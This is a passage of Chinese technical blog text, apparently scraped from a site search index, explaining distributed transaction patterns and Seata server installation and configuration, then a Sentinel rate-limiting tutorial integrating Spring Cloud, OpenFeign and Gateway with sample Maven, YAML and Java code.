4）消息中间件需要提供失败消息的查询接口，下游系统会定期查询失败消息，并将其消费 优缺点： 优点： 一种非常经典的实现，实现了最终一致性 缺点： 消息表会耦合到业务系统中，如果没有封装好的解决方案，会有很多杂活需要处理，在业界并没有成熟的方案来解决 基于可靠消息服务的分布式事务基于可靠消息服务的方案是通过消息中间件保证上、下游应用数据操作的一致性。假设有 A 和 B 两个系统，分别可以处理任务 A 和任务 B。此时存在一个业务流程，需要将任务 A 和任务 B 在同一个事务中处理，此时就可以使用消息中间件来实现这种分布式事务。 第一步：消息由系统 A 投递到消息中间件 1）在系统 A 处理任务 A 前，首先向消息中间件发送一条消息 2）消息中间件收到后将该条消息持久化，但并不投递。持久化成功后，向 A 回复一个确认应答 3）系统 A 收到确认应答后，则可以开始处理任务 A 4）任务 A 处理完成后，向消息中间件发送 Commit 或者 Rollback 请求。该请求发送完成后，对系统 A 而言，该事务的处理过程就结束了 5）如果消息中间件收到 Commit，则向 B 系统投递消息；如果收到 Rollback，则直接丢弃消息。但是如果消息中间件收不到 Commit 和 Rollback 指令，那么就要依靠” 超时询问机制” 超时询问机制 系统 A 除了实现正常的业务流程外，还需提供一个事务询问的接口，供消息中间件调用。当消息中间件收到发布消息便开始计时，如果到了超时没收到确认指令，就会主动调用系统 A 提供的事务询问接口询问该系统目前的状态。该接口会返回三种结果，中间件根据三种结果做出不同反应： 提交：将该消息投递给系统 B 回滚：直接将消息丢弃 处理中：继续等待 第二步：消息由中间件投递到系统 B 消息中间件向下游系统投递完消息后便进入阻塞等待状态，下游系统便立即进行任务的处理，任务处理完成后便向消息中间件返回应答。 如果消息中间件收到确认应答后便认为该事务处理完毕 如果消息中间件在等待确认应答超时之后就会重新投递，直到下游消费者返回消费成功响应为止。一般消息中间件可以设置消息重试的次数和时间间隔，如果最终还是不能成功投递，则需要手工干预。这里之所以使用人工干预，而不是使用让 Ａ 系统回滚，主要是考虑到整个系统设计的复杂度问题 基于可靠消息服务的分布式事务，前半部分使用异步，注重性能；后半部分使用同步，注重开发成本。 Seata 介绍Seata 简介2019 年 1 月，阿里巴巴中间件团队发起了开源项目 Fescar（Fast &amp; Easy Commit And Rollback），其愿景是让分布式事务的使用像本地事务的使用一样，简单和高效，并逐步解决开发者们遇到的分布式事务方面的所有难题。Fescar 开源后，蚂蚁金服加入 Fescar 社区参与共建，并在 Fescar 0.4.0 版本中贡献了 TCC 模式。为了打造更中立、更开放、生态更加丰富的分布式事务开源社区，经过社区核心成员的投票，决定对 Fescar 进行品牌升级，于 2019 年 5 月 开始更名为 Seata，意为：Simple Extensible Autonomous Transaction Architecture，是一套一站式分布式事务解决方案，为用户提供了 AT、TCC、SAGA 和 XA 事务模式。Seata 融合了阿里巴巴和蚂蚁金服在分布式事务技术上的积累，并沉淀了新零售、云计算和新金融等场景下丰富的实践经验，但要实现适用于所有的分布式事务场景的愿景，仍有很长的路要走。更多介绍可参考：Seata 项目、Seata 官方示例代码、Seata 官网、Seata 官方中文文档 Seata 演进历史 TXC：Taobao Transaction Constructor，阿里巴巴中间件团队自 2014 年起启动该项目，以满足应用程序架构从单一服务变为微服务所导致的分布式事务问题 GTS：Global Transaction Service，2016 年 TXC 作为阿里中间件的产品，更名为 GTS 发布 FESCAR：2019 年开始基于 TXC/GTS 开源 FESCAR SEATA：2019 年 5 月 FESCAR 更名为 SEATA Seata 设计理念Seata 的设计目标是对业务无侵入，因此从业务无侵入的 2PC 方案着手，在传统 2PC 的基础上演进。它把一个分布式事务理解成一个包含了若干分支事务的全局事务。全局事务的职责是协调其下管辖的分支事务达成一致，要么一起成功提交，要么一起失败回滚。此外，通常分支事务本身就是一个关系型数据库的本地事务。 Seata 的三大组件 TC：Transaction Coordinator 事务协调器，维护全局和分支事务的状态，负责协调并驱动全局事务的提交或回滚 TM：Transaction Manager 事务管理器，控制全局事务的边界，负责开启一个全局事务，并最终发起全局提交或全局回滚的决议 RM：Resource Manager 资源管理器，管理分支事务处理的资源，向 TC 注册分支事务，上报分支事务的状态，接受 TC 的命令来提交或者回滚分支事务 Seata 的执行流程 1）A 服务的 TM 向 TC 申请开启一个全局事务，TC 就会创建一个全局事务并返回一个唯一的 XID 2）A 服务的 RM 向 TC 注册分支事务，并将其纳入 XID 对应全局事务的管辖 3）A 服务执行分支事务，向数据库执行操作 4）A 服务开始远程调用 B 服务，此时 XID 会在微服务的调用链上传播 5）B 服务的 RM 向 TC 注册分支事务，并将其纳入 XID 对应的全局事务的管辖 6）B 服务执行分支事务，向数据库执行操作 7）全局事务调用链处理完毕，TM 根据有无异常向 TC 发起全局事务的提交或者回滚 8）TC 协调其管辖之下的所有分支事务，决定是否回滚 Seata 实现的 2PC 与传统 2PC 的区别 1）架构层次方面：传统 2PC 方案的 RM 实际上是在数据库层，RM 本质上就是数据库自身，通过 XA 协议实现，而 Seata 的 RM 是以 Jar 包的形式作为中间件层部署在应用程序这一侧的 2）两阶段提交方面：传统 2PC 无论第二阶段的决议是 Commit 还是 Rollback，事务性资源的锁都要保持到 Phase2 完成才释放。而 Seata 的做法是在 Phase1 就将本地事务提交，这样就可以省去 Phase2 持锁的时间，整体提高了效率 Seata Server 安装Seata 分 TC、TM 和 RM 三个角色，TC（Server 端）需要单独作为服务端部署，TM 和 RM（Client 端）由业务系统集成（如 Maven、Gradle）。 Seata Server 下载1）Seata Server 的官方下载地址在这里，直接下载已编译好的二进制包（seata-server-1.4.0.tar.gz ），然后解压即可使用 12345# 下载$ wget https://github.com/seata/seata/releases/download/v1.4.0/seata-server-1.4.0.tar.gz# 解压$ tar -xvf seata-server-1.4.0.tar.gz 2）Seata 的初始化资源的官方下载地址在这里，需要下载 Seata 的源代码包（Source code），后面初始化数据库或者配置中心时会用到资源目录里的文件 1234567891011# 下载$ wget https://github.com/seata/seata/archive/v1.4.0.tar.gz# 解压# tar -xvf v1.4.0.tar.gz# 资源目录的结构seata-1.4.0/script├── client├── config-center└── server 资源目录说明如下： server：Server 端数据库脚本及各个容器配置 client：存放 Client 端的 SQL 脚本、参数配置 config-center：各个配置中心参数导入脚本，其中的 config.txt(包含 Server 和 Client，原名为 nacos-config.txt) 为通用参数文件 Seata Server 配置1）将 Seata Server（TC）的存储模式更改为 DB，即使用数据库来存储全局事务会话信息，同时自定义事务组的名称。这里演示使用的数据库为 MySQL，默认支持的数据库类型包括：MySQL、Oracle、PostgreSQL、H2、Oceanbase，其中 service.vgroupMapping 的详细介绍可以看自定义事务组的名称 12345678910111213141516171819202122232425262728# 备份配置文件$ cp seata/conf/file.conf seata/conf/file.conf.bak# 编辑配置文件，更改或者新增以下内容$ vim seata/conf/file.confservice { vgroupMapping.tx_group_test = "default" #自定义事务组的名称，若不存在service配置项，直接新增对应的配置内容即可 default.grouplist = "127.0.0.1:8091" enableDegrade = false disable = false max.commit.retry.timeout = "-1" max.rollback.retry.timeout = "-1" disableGlobalTransaction = false}store { mode = "db" # 存储模式 db { dbType = "mysql" # 数据库类型 datasource = "druid" # 数据库连接池 driverClassName = "com.mysql.cj.jdbc.Driver" # 数据库驱动 url = "jdbc:mysql://127.0.0.1:3306/seata?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false" # 数据库连接地址 user = "mysql" # 数据库用户名 password = "mysql" # 数据库密码 }} 2）初始化 Seata Server（TC）依赖的 MySQL 数据库，用于存储全局事务会话信息，SQL 初始化脚本的位置是 Seata 源码目录下的 script/server/db/mysql.sql。全局事务会话信息由三块内容构成，全局事务 –&gt; 分支事务 –&gt; 全局锁，对应的表分别是 global_table、branch_table、lock_table 12345678910111213141516171819# 创建Seata数据库mysql&gt; create database seata default character set utf8;# 切换数据库mysql&gt; use seata;# 执行SQL初始化脚本mysql&gt; source seata-1.4.0/script/server/db/mysql.sql# 查看数据库表mysql&gt; show tables;+-----------------+| Tables_in_seata |+-----------------+| branch_table || global_table || lock_table |+-----------------+3 rows in set (0.00 sec) 3）指定 Seata Server（TC）依赖的注册中心，这里使用的注册中心是 Nacos。为了演示方便，这里不再使用配置中心来存储 TC 的相关配置，即直接使用本地的 file.conf 配置文件。默认支持的注册中心与配置中心列表如下： 配置中心支持类型：File、Nacos 、Apollo、Zookeeper、Consul、Etcd3 注册中心支持类型：File 、Nacos 、Eureka、Zookeeper、Consul、Etcd3、Sofa、Redis 123456789101112131415161718192021222324252627# 备份配置文件$ cp seata/conf/registry.conf seata/conf/registry.conf.bak# 编辑配置文件，更改或者新增以下内容$ vim seata/conf/registry.confregistry { type = "nacos" nacos { application = "seata-server" serverAddr = "127.0.0.1:8848" group = "SEATA_GROUP" namespace = "" cluster = "default" username = "" password = "" }}config { type = "file" file { name = "file.conf" }} Seata Server 启动先将 Seata Server 依赖的数据库、注册中心服务启动了，最后才启动 Seata Server。 1234567891011121314# 创建GC的日志目录$ mkdir seata/logs# 进入bin目录$ cd seata/bin# 执行启动脚本$ sh seata-server.sh# 或者后台启动$ nohup sh seata-server.sh &amp;# 或者指定启动参数$ sh seata-server.sh -h 127.0.0.1 -p 8091 -n 1 启动参数说明如下： -h: 注册到注册中心的 IP -p: Seata Server 的本地监听端口，默认端口是 8091 -m: 全局事务会话信息存储模式，file、db、redis，优先读取启动参数 (Seata-Server 1.3 及以上版本支持 Redis) -n: Server Node，多个 Server 时，需区分各自节点，用于生成不同区间的 transactionId，以免冲突 -e: 多环境配置可以参考这里 特别注意：堆内存建议分配 2G，堆外内存 1G，JVM 的内存参数可以直接在 seata/bin/-server.sh 脚本里调整 Seata Server 成功启动后，在注册中心的服务列表里，可以看到 Seata Server 的服务已经成功注册： Seata Server 配置介绍配置文件说明 conf/file.conf： TC 的配置文件，用于指定 TC 的相关配置。如果使用了配置中心，也可以将 file.conf 里的配置信息写入到配置中心。 conf/registry.conf：用于指定 TC 的注册中心和 TC 的配置文件，默认类型都是 file。如果使用其他注册中心，要求 Seata Server 自身也注册到注册中心。 配置中心使用若在 registry.conf 中指定使用配置中心来存储 TC 的相关配置（如下），即利用配置中心来替代 file.conf 配置文件，那么此时需要手动将 file.conf 里的配置信息添加到配置中心 12345678910111213config { type = "nacos" nacos { serverAddr = "127.0.0.1:8848" namespace = "" group = "SEATA_GROUP" username = "" password = "" } ...} Seata 官方提供了将配置信息批量写入到各种主流配置中心的 Shell 脚本，存放路径是在 Seata 源码目录下的 script/config-center 目录（如下） 1234567891011121314script/config-center├── apollo│&nbsp;&nbsp; └── apollo-config.sh├── config.txt├── consul│&nbsp;&nbsp; └── consul-config.sh├── etcd3│&nbsp;&nbsp; └── etcd3-config.sh├── nacos│&nbsp;&nbsp; ├── nacos-config.py│&nbsp;&nbsp; └── nacos-config.sh├── README.md└── zk └── zk-config.sh 其中 config.txt 为通用参数文件，包含了 Seata Server 需要的所有配置信息，只需执行对应的 Shell 脚本将配置信息写入到配置中心即可。值得一提的是，config.txt 文件必须在 xxxx.sh 的上级目录里；若使用 Nacos 作为配置中心，执行脚本时可以指定一些启动参数，如 Nacos 的 IP、端口号、命名空间、配置组等，Shell 脚本的具体使用方法可以查看 script/config-center/README.md 说明文档。 1$ nacos-config.sh -h 127.0.0.1 -p 8848 -t namespace -g group -u username -w password 成功批量导入配置信息到配置中心后，控制台会输出如下提示： 1234========================================================================= Complete initialization parameters, total-count:79 , failure-count:0========================================================================= Init nacos config finished, please start seata-server. 访问 Nacos 的控制台，可以看到已经有对应的配置信息 配置 TC 的存储模式Seata Server（TC）的存储模式现有 File、DB、Redis 三种（后续将引入 Raft、Mongodb），需要在 file.conf 配置文件中指定（如下） 123456789101112131415161718192021store { mode = "file" ## file store property file { ## store location dir dir = "sessionStore" # branch session size , if exceeded first try compress lockkey, still exceeded throws exceptions maxBranchSessionSize = 16384 # globe session size , if exceeded throws exceptions maxGlobalSessionSize = 512 # file buffer size , if exceeded allocate new buffer fileWriteBufferCacheSize = 16384 # when recover batch read size sessionReloadReadSize = 100 # async, sync flushDiskMode = async } ...} 默认存储模式为 File，若使用 File 模式则无需改动任何配置，直接启动即可，每种模式的说明如下： File 模式为单机模式，全局事务会话信息在内存中读写，并持久化为本地文件 root.data，性能较高 DB 模式为高可用模式，全局事务会话信息通过 DB 共享，性能会差一点 Redis 模式在 Seata-Server 1.3 及以上版本开始支持，性能较高，存在事务信息丢失风险，需要配置合适当前场景的 Redis 持久化配置 自定义事务组的名称特别注意，file.conf 中的 service.vgroupMapping 这个配置，在 Spring Cloud 中的值默认是 ${spring.application.name}-fescar-service-group，可以通过指定 application.yml 中的 spring.cloud.alibaba.seata.tx-service-group 这个属性来覆盖；但是必须要和 file.conf 中的 service.vgroupMapping 一致，否则会出现 no available service \'null\' found, please make sure registry config correct 的错误，举例说明如下： 123service { vgroupMapping.tx_group_test = "default"} 12345spring: cloud: alibaba: seata: tx-service-group: tx_group_test 在上述的配置中，Spring Cloud 中 tx-service-group 的值也必须为 tx_group_test；如果将 vgroupMapping.xxxx 中的 xxxx（Key 值）改为 abcdefg，则 Spring Cloud 中 tx-service-group 的值也必须为 abcdefg，即这两个值必须保持一致 Seata Server 的坑default.grouplist 属性在 Seata Server 的 file.conf 配置文件中，有个 default.grouplist 配置，该配置的使用说明如下： 1）只有在 registry.conf 中配置了 registry.type=file，即注册中心是 File 模式时，该配置才会起作用 2）对应的值可以配置多个，配置多个就需要搭建 Seata Server 集群。由于默认并未提供本地文件的同步功能，所以在 store.mode=file 模式下，这种集群方式的配置会报错；如果 Seata Server 搭建为集群，且 store.mode=db，这样就可以通过 DB 来共享 TC（Seata Server） 集群间的数据 3）当 registry.type=file 时，这个 default.grouplist 才会起作用，但是 File 方式并不能提供一个注册中心的完整功能，比如健康检查机制，实例列表的更新剔出等，建议选择 Nacos 、Eureka、Redis、Zookeeper、Consul、Etcd3、Sofa 作为注册中心 4）registry.type=file 或 config.type=file 的设计初衷，是让开发者在不依赖第三方注册中心或配置中心的前提下，可以通过 File 这种简单的直连快速验证 Seata 服务，达到快速上手的目的 service.vgroup_mapping 属性Seata Server &lt;=1.0 的版本用的是 service.vgroup_mapping，但在新版本里改成了 service.vgroupMapping。若应用启动后无法连接 Seata Server，且抛出了以下异常信息，此时应该注意使用的是不是旧的 service.vgroup_mapping 1no available service \'null\' found, please make sure registry config correct 在 file.conf 配置文件中，service.vgroupMapping 支持配置多个： 1234service.vgroupMapping.user-service-group=defaultservice.vgroupMapping.order-service-group=defaultservice.vgroupMapping.account-service-group=defaultservice.vgroupMapping.storage-service-group=default 参考文献 分布式事务解决方案 微服务分布式事务 4 种解决方案实战 大规模 SOA 系统中的分布事务处事（程立） 下篇 - Seata 入门教程（电商实战篇） Seata 入门教程 - 实战篇（电商） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务 分布式"},{title:"Sentinel 入门教程 - 整合篇",url:"/posts/63e3926c.html",text:'前言为了减少开发的复杂度，Sentinel 对大部分的主流框架，例如 Web Servlet、Dubbo、Spring Cloud、gRPC、Spring WebFlux，Reactor 等都做了适配，只需要引入对应的依赖即可方便的整合 Sentinel。如果要实现 Spring Cloud 和 Sentinel 的整合，可以通过引入 Spring Cloud Alibaba Sentinel 来整合 Sentinel。Spring Cloud Alibaba 是阿里巴巴开源的，致力于提供微服务开发的一站式解决方案。Spring Cloud Alibaba 默认为 Sentinel 整合了 Servlet、RestTemplate、FeignClient 和 Spring WebFlux。Sentinel 在 Spring Cloud 生态中，不仅补全了 Hystrix 在 Servlet 和 RestTemplate 这一块空白，而且还完全兼容了 Hystrix 在 FeignClient 中限流降级的用法，并且支持运行时灵活地配置和调整限流降级规则。 Sentinel 整合 Spring Cloud1.0、版本说明本案例使用各开源组件的版本说明如下，点击下载完整的案例代码 Sentinel 1.8.0 Spring Boot 2.1.18.RELEASE Spring Cloud Greenwich.SR6 Spring Cloud Alibaba Sentinel 2.1.3.RELEASE 1.1、引入 Maven 依赖添加 spring-cloud-starter-alibaba-sentinel 依赖 1234567891011121314151617181920212223242526272829303132&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;spring-cloud.version&gt;Greenwich.SR6&lt;/spring-cloud.version&gt; &lt;spring-cloud-starter-sentinel&gt;2.1.3.RELEASE&lt;/spring-cloud-starter-sentinel&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring-cloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-starter-sentinel}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 1.2、创建主启动类1234567@SpringBootApplicationpublic class SentinelApplication { public static void main(String[] args) { SpringApplication.run(SentinelApplication.class, args); }} 1.3、创建 Controller 测试类12345678910111213141516171819202122232425262728@RestControllerpublic class TestController { /** * 定义资源 * value：资源名称 * blockHandler：限流处理的方法 * * @return */ @SentinelResource(value = "Hello", blockHandler = "exceptionHandler") @GetMapping("/hello") public String hello() { // 使用限流规则 return "Hello Sentinel!"; } /** * 原方法被限流的时候调用此方法 * * @param e * @return */ public String exceptionHandler(BlockException e) { e.printStackTrace(); return "系统繁忙，请稍候 ..."; }} 1.4、配置 Sentinel 控制台在 application.yml 配置文件里，指定 Sentinel 控制台的地址和端口 12345678910server: port: 8080spring: application: name: sentinel-spring-cloud cloud: sentinel: transport: dashboard: 127.0.0.1:9000 1.5、测试代码 1）启动 Sentinel 控制台 1$ java -Dserver.port=9000 -jar sentinel-dashboard-1.8.0.jar 2）启动 Spring Cloud 应用，浏览器访问 http://127.0.0.1:8080/hello，若响应结果返回 Hello Sentinel!，说明应用启动成功 3）浏览器访问 http://127.0.0.1:9000，打开 Sentinel 控制台，动态添加流控规则，如下图所示： 4）浏览器再次访问 http://127.0.0.1:8080/hello，当快速刷新页面时，请求的响应结果变为 系统繁忙，请稍后 ...，，则说明 Sentinel 的流控规则生效了 Sentinel 整合 OpenFeignSentinel 适配了 OpenFeign 组件，如果想使用，除了引入 spring-cloud-starter-alibaba-sentinel 依赖之外，还需要以下两个步骤： 在配置文件里打开 Sentinel 对 OpenFeign 的支持：feign.sentinel.enabled=true 加入 spring-cloud-starter-openfeign 依赖使 Sentinel starter 中的自动化配置类生效 2.0、版本说明本案例使用各开源组件的版本说明如下，其中服务注册中心使用 Nacos，若改为使用 Eureka，只需要在案例里将 Nacos 相关的配置（Maven 依赖 + YAML 配置）替换掉即可，点击下载完整的案例代码 Sentinel 1.8.0 Nacos Server 1.4.0 Spring Boot 2.1.18.RELEASE Spring Cloud Greenwich.SR6 Spring Cloud Alibaba Sentinel 2.1.3.RELEASE Spring Cloud Alibaba Nacos Config 2.1.3.RELEASE 2.1、案例目标实现 sentinel-consumer 微服务通过 OpenFeign 访问 sentinel-provider 微服务时的流量控制 2.2、准备工作启动 Sentinel 控制台 1$ java -Dserver.port=9000 -jar sentinel-dashboard-1.8.0.jar 启动 Nacos Server，并在 Nacos Server 的控制面台里，创建名称为 dev 的命名空间 2.3、创建 Maven 父工程创建 Maven 父工程，配置好工程需要的父级依赖，目的是为了更方便管理与简化配置 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;spring-cloud.version&gt;Greenwich.SR6&lt;/spring-cloud.version&gt; &lt;spring-cloud-starter-sentinel&gt;2.1.3.RELEASE&lt;/spring-cloud-starter-sentinel&gt; &lt;spring-cloud-starter-nacos.version&gt;2.1.3.RELEASE&lt;/spring-cloud-starter-nacos.version&gt;&lt;/properties&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring-cloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-starter-sentinel}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-starter-nacos.version}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 2.4、创建 Sentinel Provider 工程引入 Maven 依赖 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建主启动类，添加 @EnableDiscoveryClient 注解，启用服务发现功能，并将服务注册到 Nacos 12345678@SpringBootApplication@EnableDiscoveryClientpublic class ProviderApplication { public static void main(String[] args) { SpringApplication.run(ProviderApplication.class, args); }} 创建 Controller 测试类 1234567891011@RestControllerpublic class ProviderController { private Logger LOG = LoggerFactory.getLogger(ProviderController.class); @GetMapping("/hello") public String hello() { LOG.info("provider invoke ... "); return "Hello Sentinel!"; }} 创建 application.yml 配置文件，添加 Nacos 注册中心的地址和端口等信息 1234567891011121314server: port: 8080 servlet: context-path: /providerspring: application: name: sentinel-provider cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 cluster-name: DEFAULT 2.5、创建 Sentinel Consumer 工程引入 Maven 依赖，包括 spring-cloud-starter-openfeign、spring-cloud-starter-alibaba-sentinel 1234567891011121314&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Feign Client 的接口类 123456@FeignClient(value = "sentinel-provider", fallback = FallbackService.class)public interface FeignAgent { @GetMapping("/provider/hello") public String hello();} 创建处理限流、降级的回调类 12345678@Componentpublic class FallbackService implements FeignAgent { @Override public String hello() { return "系统繁忙，请稍候 ..."; }} 创建主启动类，添加 @EnableDiscoveryClient、@EnableFeignClients 注解 123456789@SpringBootApplication@EnableDiscoveryClient@EnableFeignClientspublic class ConsumerApplication { public static void main(String[] args) { SpringApplication.run(ConsumerApplication.class, args); }} 创建 Controller 测试类 1234567891011121314@RestControllerpublic class ConsumerController { @Autowired private FeignAgent feignAgent; private Logger LOG = LoggerFactory.getLogger(ConsumerController.class); @GetMapping("/hello") public String hello() { LOG.info("consumer invoke ... "); return feignAgent.hello(); }} 创建 application.yml 配置文件，添加 Nacos 注册中心的地址和端口等信息，并启用 Sentinel 对 OpenFeign 的支持 123456789101112131415161718192021server: port: 8082 servlet: context-path: /consumerspring: application: name: sentinel-consumer cloud: nacos: discovery: server-addr: 127.0.0.1:8848 namespace: 4bfcbae8-8c37-417d-89e4-d5134e23eb18 cluster-name: DEFAULT sentinel: transport: dashboard: 127.0.0.1:9000feign: sentinel: enabled: true 2.6、测试代码 1）分别启动 sentinel-consumer、sentinel-provider 应用 2）浏览器访问 http://127.0.0.1:8082/consumer/hello，若响应结果为 Hello Sentinel!，说明两个应用启动成功，同时在 Nacos 的控制台可以看到已经有两个服务注册了，如下图所示： 3）浏览器访问 http://127.0.0.1:9000，打开 Sentinel 的控制台，动态添加流控规则，如下图所示： 特别注意：Sentinel 与 Feign 整合时，流控规则的编写格式为 HTTP请求方式:协议://服务名/请求路径跟参数，例如：GET:http://sentinel-provider/provider/hello 4）浏览器再次访问 http://127.0.0.1:8082/consumer/hello，当快速刷新页面时，请求的响应结果变为 系统繁忙，请稍后 ...，则说明 sentinel-consumer 微服务通过 OpenFeign 访问 sentinel-provider 微服务时，Sentinel 的流控规则生效了 Sentinel 网关限流Sentinel 支持对 Spring Cloud Gateway、Zuul 1.x、Zuul 2.x 等主流的 API Gateway 进行限流。 Sentinel 整合 Gateway从 1.6.0 版本开始，Sentinel 提供了 Spring Cloud Gateway 的适配模块，可以提供两种资源维度的限流： route 维度：即在 Spring 配置文件中配置的路由条目，资源名为对应的 routeId 自定义 API 维度：用户可以利用 Sentinel 提供的 API 来自定义一些 API 分组 3.0、案例说明本案例是在上述 Sentinel 整合 OpenFeign 案例的基础上开发的，注册中心依旧使用 Nacos，其中主要的变化是新创建了 sentinel-gateway 工程，因此下面只给出新增或者更改后的代码和配置，点击下载完整的案例代码。 3.1、案例目标实现 sentinel-gateway 微服务访问 sentinel-consumer 微服务时的流量控制，其中 sentinel-consumer 微服务通过 OpenFeign 访问 sentinel-provider 微服务时的流量控制在上述 Sentinel 整合 OpenFeign 案例已经实现了，完整的调用流程为 sentinel-gateway –&gt; sentinel-consumer –&gt; sentinel-provider。 3.2、准备工作启动 Sentinel 控制台 1$ java -Dserver.port=9000 -jar sentinel-dashboard-1.8.0.jar 启动 Nacos Server，并在 Nacos Server 的控制面台里，创建名称为 dev 的命名空间 3.3、更改 Maven 父工程添加 spring-cloud-alibaba-sentinel-gateway 依赖 123456789&lt;properties&gt; &lt;spring-cloud-starter-sentinel&gt;2.1.3.RELEASE&lt;/spring-cloud-starter-sentinel&gt;&lt;/properties&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-alibaba-sentinel-gateway&lt;/artifactId&gt; &lt;version&gt;${spring-cloud-starter-sentinel}&lt;/version&gt;&lt;/dependency&gt; 3.4、创建 Sentinel Gateway 工程引入 Maven 依赖 123456789101112131415161718&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-alibaba-sentinel-gateway&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Gateway 的配置类，用于定义被限流或者降级时处理的方法 12345678910111213141516171819@Configurationpublic class GatewayConfiguration { /** * 初始化 */ @PostConstruct public void init() { // 设置被限流或者降级处理时的回调方法 GatewayCallbackManager.setBlockHandler(new BlockRequestHandler() { // 被限流或者降级时处理的方法 @Override public Mono&lt;ServerResponse&gt; handleRequest(ServerWebExchange serverWebExchange, Throwable throwable) { return ServerResponse.status(200).syncBody("系统繁忙，请稍后 ..."); } }); }} 创建主启动类，添加 @EnableDiscoveryClient 注解 12345678@SpringBootApplication@EnableDiscoveryClientpublic class GatewayApplication { public static void main(String[] args) { 